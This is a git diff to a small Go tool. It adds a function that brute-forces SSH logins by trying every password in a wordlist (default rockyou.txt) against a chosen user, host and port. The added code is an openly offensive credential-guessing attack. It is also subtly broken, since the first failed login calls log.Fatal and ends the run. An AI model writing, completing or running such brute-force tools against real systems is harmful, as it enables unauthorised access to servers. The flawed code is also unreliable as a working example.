@@ -3,6 +3,7 @@ package main
 https://gist.github.com/andrielfn/7aa336f9b6dc9e2a5dac
 https://skarlso.github.io/2019/02/17/go-ssh-with-host-key-verification/
 https://gist.github.com/montanaflynn/b59c058ce2adc18f31d6
+https://zetcode.com/golang/readfile/
 */
 import (
   "fmt"
@@ -12,11 +13,15 @@ import (
   "net"
   "regexp"
   "os"
+  "bufio"
+  "golang.org/x/crypto/ssh"
 
 )
 type Verify struct{
 address string
 port int
+name string
+pass_file string
 }
 
 func Banner(){
@@ -57,13 +62,48 @@ defer fmt.Printf("Time: %v\n",time.Now())
   }
                 return &check_values
         }
+
+    func BruteForce(sshuser string, wordlist string, victim string, port int) *Verify{
+      brute := Verify{address: victim, port: port, name: sshuser, pass_file: wordlist}
+      brute_target := fmt.Sprintf("%s:%v",brute.address,brute.port)
+      passwords,err := os.Open(brute.pass_file)
+      if err != nil{
+log.Fatal(err)
+      }
+      defer passwords.Close()
+      readlines := bufio.NewScanner(passwords)
+      for readlines.Scan(){
+    config := &ssh.ClientConfig{
+        User: brute.name,
+        Auth: []ssh.AuthMethod{
+                ssh.Password(readlines.Text()),
+        },
+}
+if err := readlines.Err(); err != nil{
+log.Fatal(err)
+}
+client, err := ssh.Dial("tcp", brute_target, config)
+
+if err != nil {
+  log.Fatal(err)
+}
+
+defer client.Close()
+}
+return &brute
+}
 func main(){
   addrFlag := flag.String("ip","127.0.0.1","Ip address")
   portFlag := flag.Int("port",22,"Port")
+  userFlag := flag.String("user","ubuntu","SSH-User-name")
+  passFlag := flag.String("wordlist","rockyou.txt","Wordlist")
   flag.Parse()
-  obj := Verify{*addrFlag,*portFlag}
+  obj := Verify{*addrFlag,*portFlag,*userFlag,*passFlag}
   var value1 = obj.address 
   var value2 = obj.port
+  var value3 = obj.name
+  var value4 = obj.pass_file
   Banner()
 Check(value1,value2)
+BruteForce(value3,value4,value1,value2)
 }
